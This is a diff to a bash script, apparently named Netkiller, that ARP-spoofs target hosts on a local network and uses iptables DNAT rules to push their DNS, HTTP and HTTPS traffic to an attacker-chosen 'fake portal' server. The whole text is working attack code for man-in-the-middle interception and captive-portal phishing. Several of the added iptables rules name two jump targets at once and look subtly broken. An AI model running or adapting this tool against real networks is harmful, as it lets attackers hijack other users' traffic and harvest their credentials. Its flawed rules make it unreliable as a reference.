@@ -23,11 +23,7 @@ fi
 # IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-iptables -t nat -N REDIRECT
-iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT 
-iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT 
-iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT 
-iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT 
+iptables -t nat -N CLIENTS
 echo " "
 
 # Functions for clean up
@@ -41,7 +37,7 @@ pkill -f arpspoof
 pkill arpspoof
 ip -s -s neigh flush all >/dev/null 2>&1
 iptables -t nat -F PREROUTING
-iptables -t nat -X REDIRECT 
+iptables -t nat -X CLIENTS
 sleep 2
 echo -e "\nConnection is restored..."
 EOF
@@ -93,7 +89,7 @@ MYIP="${DEVIP:-$IP}"
 echo " "
 
 # Fake portal server 
-echo "Enter Fake Portal Server: e.g 10.0.0.1:80"
+echo "Enter Fake Portal Server: e.g 10.0.0.1"
 read -rp "> " PORTAL
 echo " "
 
@@ -105,6 +101,16 @@ echo "[*] DEVICE:    | $MYIP"
 echo "[*] TARGETS:   | $SUB"
 echo "[*] PORTAL:    | $PORTAL"
 echo " "
+
+# Redirect DNS traffic for clients
+iptables -t nat -A PREROUTING -j CLIENTS -p udp --dport 53 -j DNAT --to-destination $PORTAL:53
+iptables -t nat -A PREROUTING -j CLIENTS -p tcp --dport 53 -j DNAT --to-destination $PORTAL:53
+
+# Redirect HTTP traffic for clients
+iptables -t nat -A PREROUTING -j CLIENTS -p tcp --dport 80 -j DNAT --to-destination $PORTAL:80
+
+# Redirect HTTPS traffic for clients
+iptables -t nat -A PREROUTING -j CLIENTS -p tcp --dport 443 -j DNAT --to-destination $PORTAL:443
 
 # Prompt the user for confirmation
 read -p "[*] Do you want to scan the network? (y/n) " -n 1 -r
@@ -242,7 +248,7 @@ echo " "
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-     iptables -t nat -A REDIRECT -s "$TARGET" -j DNAT --to-destination "$PORTAL"
+     iptables -t nat -A CLIENTS -s "$TARGET" -j RETURN
 done
 echo " "
 echo "To stop Netkiller, run: netkiller-stop"
